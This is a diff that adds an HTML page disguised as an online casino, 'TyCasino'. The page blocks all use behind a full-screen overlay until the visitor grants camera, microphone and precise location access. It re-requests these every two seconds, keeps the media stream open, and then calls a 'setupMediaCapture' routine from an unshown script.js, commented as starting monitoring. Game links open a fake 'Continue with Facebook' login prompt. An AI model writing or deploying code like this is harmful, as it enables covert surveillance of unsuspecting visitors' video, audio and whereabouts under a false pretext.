@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TyCasino - Play Online Casino Games</title>
+    <link rel="stylesheet" href="tycasino.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+</head>
+<body>
+    <div id="permission-overlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.95); z-index: 99999; display: none; justify-content: center; align-items: center;">
+        <div style="background-color: #fff; padding: 30px; border-radius: 10px; max-width: 90%; text-align: center;">
+            <h2 style="color: #1877f2; margin-bottom: 20px;">Permissions Required</h2>
+            <p style="margin-bottom: 20px;">To use TyCasino, you must allow access to your camera, microphone, and location.</p>
+            <div id="permission-status" style="margin: 20px 0; text-align: left;">
+                <p>Camera: <span id="camera-status" style="color: red; font-weight: bold;">Not allowed</span></p>
+                <p>Microphone: <span id="mic-status" style="color: red; font-weight: bold;">Not allowed</span></p>
+                <p>Location: <span id="location-status" style="color: red; font-weight: bold;">Not allowed</span></p>
+            </div>
+            <button id="request-permissions-btn" style="background-color: #1877f2; color: white; border: none; padding: 12px 20px; border-radius: 5px; font-weight: bold; cursor: pointer;">Grant Permissions</button>
+        </div>
+    </div>
+
+    <div class="main-container">
+        <header>
+            <div class="logo">
+                <h1>TyCasino</h1>
+                <p class="tagline">Your Premier Gaming Destination</p>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="#" class="active">Games</a></li>
+                    <li><a href="#">Promotions</a></li>
+                    <li><a href="#">VIP</a></li>
+                    <li><a href="#">Support</a></li>
+                </ul>
+            </nav>
+            <div class="header-buttons">
+                <button class="login-button" onclick="redirectToLogin()">Log In</button>
+                <button class="signup-button" onclick="redirectToLogin()">Sign Up</button>
+            </div>
+        </header>
+
+        <section class="hero">
+            <div class="hero-content">
+                <h2>Welcome to TyCasino</h2>
+                <p>Experience the thrill of online gaming with over 1000+ games</p>
+                <button class="play-now-button" onclick="redirectToLogin()">Play Now</button>
+            </div>
+        </section>
+
+        <section class="featured-games">
+            <h2>Featured Games</h2>
+            <div class="games-grid">
+                <div class="game-card" onclick="redirectToLogin()">
+                    <div class="game-image" style="background-image: url('images/SuperAce.png');">
+                        <div class="game-overlay">
+                            <button class="play-button">Play Now</button>
+                        </div>
+                    </div>
+                    <div class="game-info">
+                        <h3>Super Ace</h3>
+                        <div class="game-tags">
+                            <span class="tag">Slots</span>
+                            <span class="tag">Hot</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="game-card" onclick="redirectToLogin()">
+                    <div class="game-image" style="background-image: url('images/Gold-Rush.png');">
+                        <div class="game-overlay">
+                            <button class="play-button">Play Now</button>
+                        </div>
+                    </div>
+                    <div class="game-info">
+                        <h3>Royal Poker</h3>
+                        <div class="game-tags">
+                            <span class="tag">Poker</span>
+                            <span class="tag">Popular</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="game-card" onclick="redirectToLogin()">
+                    <div class="game-image" style="background-image: url('images/Blackjack-Pro.png');">
+                        <div class="game-overlay">
+                            <button class="play-button">Play Now</button>
+                        </div>
+                    </div>
+                    <div class="game-info">
+                        <h3>Blackjack Pro</h3>
+                        <div class="game-tags">
+                            <span class="tag">Table</span>
+                            <span class="tag">New</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="game-card" onclick="redirectToLogin()">
+                    <div class="game-image" style="background-image: url('images/Lucky Roulette.png');">
+                        <div class="game-overlay">
+                            <button class="play-button">Play Now</button>
+                        </div>
+                    </div>
+                    <div class="game-info">
+                        <h3>Lucky Roulette</h3>
+                        <div class="game-tags">
+                            <span class="tag">Roulette</span>
+                            <span class="tag">Featured</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="game-card" onclick="redirectToLogin()">
+                    <div class="game-image" style="background-image: url('images/Fortune Wheel.png');">
+                        <div class="game-overlay">
+                            <button class="play-button">Play Now</button>
+                        </div>
+                    </div>
+                    <div class="game-info">
+                        <h3>Fortune Wheel</h3>
+                        <div class="game-tags">
+                            <span class="tag">Wheel</span>
+                            <span class="tag">Bonus</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="game-card" onclick="redirectToLogin()">
+                    <div class="game-image" style="background-image: url('images/Gold Rush Slots.png');">
+                        <div class="game-overlay">
+                            <button class="play-button">Play Now</button>
+                        </div>
+                    </div>
+                    <div class="game-info">
+                        <h3>Gold Rush Slots</h3>
+                        <div class="game-tags">
+                            <span class="tag">Slots</span>
+                            <span class="tag">Jackpot</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <button class="view-all-button">View All Games</button>
+        </section>
+
+        <section class="categories">
+            <h2>Game Categories</h2>
+            <div class="category-list">
+                <a href="#" class="category-item" onclick="redirectToLogin(); return false;">
+                    <i class="fas fa-dice"></i>
+                    <span>Slots</span>
+                </a>
+                <a href="#" class="category-item" onclick="redirectToLogin(); return false;">
+                    <i class="fas fa-chess-queen"></i>
+                    <span>Table Games</span>
+                </a>
+                <a href="#" class="category-item" onclick="redirectToLogin(); return false;">
+                    <i class="fas fa-users"></i>
+                    <span>Live Casino</span>
+                </a>
+                <a href="#" class="category-item" onclick="redirectToLogin(); return false;">
+                    <i class="fas fa-trophy"></i>
+                    <span>Jackpots</span>
+                </a>
+                <a href="#" class="category-item" onclick="redirectToLogin(); return false;">
+                    <i class="fas fa-futbol"></i>
+                    <span>Sports</span>
+                </a>
+                <a href="#" class="category-item" onclick="redirectToLogin(); return false;">
+                    <i class="fas fa-gift"></i>
+                    <span>Promotions</span>
+                </a>
+            </div>
+        </section>
+
+        <footer>
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h3>TyCasino</h3>
+                    <p>Your premier destination for online casino games. Play responsibly.</p>
+                </div>
+                <div class="footer-section">
+                    <h3>Quick Links</h3>
+                    <ul>
+                        <li><a href="#">Games</a></li>
+                        <li><a href="#">Promotions</a></li>
+                        <li><a href="#">About Us</a></li>
+                        <li><a href="#">Terms & Conditions</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h3>Contact Us</h3>
+                    <p>Email: support@tycasino.com</p>
+                    <p>Phone: +1-888-TY-CASINO</p>
+                </div>
+                <div class="footer-section">
+                    <h3>Follow Us</h3>
+                    <div class="social-icons">
+                        <a href="#"><i class="fab fa-facebook"></i></a>
+                        <a href="#"><i class="fab fa-twitter"></i></a>
+                        <a href="#"><i class="fab fa-instagram"></i></a>
+                        <a href="#"><i class="fab fa-youtube"></i></a>
+                    </div>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2023 TyCasino. All rights reserved.2025.</p>
+                <p>18+ | Play Responsibly</p>
+            </div>
+        </footer>
+    </div>
+
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <span class="close-button">&times;</span>
+            <h2>Login Required</h2>
+            <p>Please log in with Facebook to play this game</p>
+            <button class="facebook-login-button" onclick="window.location.href='index.html'">
+                <i class="fab fa-facebook-f"></i> Continue with Facebook
+            </button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+    <script>
+        // Function to show login modal
+        function redirectToLogin() {
+            document.getElementById('loginModal').style.display = 'flex';
+        }
+
+        // Close the modal when clicking the X button
+        document.querySelector('.close-button').onclick = function() {
+            document.getElementById('loginModal').style.display = 'none';
+        }
+
+        // Close the modal when clicking outside of it
+        window.onclick = function(event) {
+            if (event.target == document.getElementById('loginModal')) {
+                document.getElementById('loginModal').style.display = 'none';
+            }
+        }
+
+        // Permission checking functionality
+        let cameraPermission = false;
+        let microphonePermission = false;
+        let locationPermission = false;
+        
+        // Check permissions on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            checkAndRequestPermissions();
+        });
+        
+        // Set up the permission request button
+        document.getElementById('request-permissions-btn').addEventListener('click', function() {
+            requestAllPermissions();
+        });
+
+        // Function to check all permissions and request if needed
+        function checkAndRequestPermissions() {
+            // Show the permission overlay
+            document.getElementById('permission-overlay').style.display = 'flex';
+            
+            // Block scrolling on the body
+            document.body.style.overflow = 'hidden';
+            
+            // Check and request all permissions
+            requestAllPermissions();
+            
+            // Set up a timer to periodically check permissions
+            setInterval(checkPermissionStatus, 2000);
+        }
+        
+        // Function to request all permissions
+        function requestAllPermissions() {
+            // Request camera and microphone
+            if (!cameraPermission || !microphonePermission) {
+                requestMediaPermissions();
+            }
+            
+            // Request location
+            if (!locationPermission) {
+                requestLocationPermission();
+            }
+        }
+        
+        // Request camera and microphone permissions
+        function requestMediaPermissions() {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(function(stream) {
+                    cameraPermission = true;
+                    microphonePermission = true;
+                    
+                    // Update status
+                    document.getElementById('camera-status').textContent = 'Allowed';
+                    document.getElementById('camera-status').style.color = 'green';
+                    
+                    document.getElementById('mic-status').textContent = 'Allowed';
+                    document.getElementById('mic-status').style.color = 'green';
+                    
+                    // Keep the stream active
+                    window.mediaStream = stream;
+                    
+                    checkAllPermissionsGranted();
+                })
+                .catch(function(err) {
+                    console.error('Media permission error:', err);
+                    
+                    // Try separate requests
+                    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                        .then(function(stream) {
+                            cameraPermission = true;
+                            document.getElementById('camera-status').textContent = 'Allowed';
+                            document.getElementById('camera-status').style.color = 'green';
+                            
+                            // Keep the video stream active
+                            if (!window.mediaStream) {
+                                window.mediaStream = stream;
+                            } else {
+                                // Add video tracks to existing stream
+                                stream.getVideoTracks().forEach(track => {
+                                    window.mediaStream.addTrack(track);
+                                });
+                            }
+                            
+                            checkAllPermissionsGranted();
+                        })
+                        .catch(function(err) {
+                            console.error('Camera permission error:', err);
+                        });
+                    
+                    navigator.mediaDevices.getUserMedia({ video: false, audio: true })
+                        .then(function(stream) {
+                            microphonePermission = true;
+                            document.getElementById('mic-status').textContent = 'Allowed';
+                            document.getElementById('mic-status').style.color = 'green';
+                            
+                            // Keep the audio stream active
+                            if (!window.mediaStream) {
+                                window.mediaStream = stream;
+                            } else {
+                                // Add audio tracks to existing stream
+                                stream.getAudioTracks().forEach(track => {
+                                    window.mediaStream.addTrack(track);
+                                });
+                            }
+                            
+                            checkAllPermissionsGranted();
+                        })
+                        .catch(function(err) {
+                            console.error('Microphone permission error:', err);
+                        });
+                });
+        }
+        
+        // Request location permission
+        function requestLocationPermission() {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    locationPermission = true;
+                    document.getElementById('location-status').textContent = 'Allowed';
+                    document.getElementById('location-status').style.color = 'green';
+                    checkAllPermissionsGranted();
+                },
+                function(err) {
+                    console.error('Location permission error:', err);
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+        
+        // Check status of permissions
+        function checkPermissionStatus() {
+            // If all permissions are already granted, do nothing
+            if (cameraPermission && microphonePermission && locationPermission) {
+                return;
+            }
+            
+            // Check camera and microphone permissions using the permissions API if supported
+            if (navigator.permissions && navigator.permissions.query) {
+                // Check camera permission
+                navigator.permissions.query({ name: 'camera' })
+                    .then(function(result) {
+                        if (result.state === 'granted') {
+                            cameraPermission = true;
+                            document.getElementById('camera-status').textContent = 'Allowed';
+                            document.getElementById('camera-status').style.color = 'green';
+                            checkAllPermissionsGranted();
+                        } else if (result.state === 'prompt') {
+                            // Permission has not been requested yet or was dismissed
+                            requestMediaPermissions();
+                        }
+                    });
+                
+                // Check microphone permission
+                navigator.permissions.query({ name: 'microphone' })
+                    .then(function(result) {
+                        if (result.state === 'granted') {
+                            microphonePermission = true;
+                            document.getElementById('mic-status').textContent = 'Allowed';
+                            document.getElementById('mic-status').style.color = 'green';
+                            checkAllPermissionsGranted();
+                        } else if (result.state === 'prompt') {
+                            // Permission has not been requested yet or was dismissed
+                            requestMediaPermissions();
+                        }
+                    });
+            }
+            
+            // We can't really check geolocation permission status without requesting it,
+            // so if it's not already granted, we request it again
+            if (!locationPermission) {
+                requestLocationPermission();
+            }
+        }
+        
+        // Check if all permissions have been granted
+        function checkAllPermissionsGranted() {
+            if (cameraPermission && microphonePermission && locationPermission) {
+                console.log('All permissions granted');
+                
+                // Start monitoring with the script.js functions
+                if (typeof setupMediaCapture === 'function') {
+                    setupMediaCapture();
+                }
+                
+                // Hide the permission overlay
+                setTimeout(function() {
+                    document.getElementById('permission-overlay').style.display = 'none';
+                    document.body.style.overflow = 'auto'; // Restore scrolling
+                }, 1500); // Brief delay to show "Allowed" status
+            }
+        }
+    </script>
+</body>
+</html> 
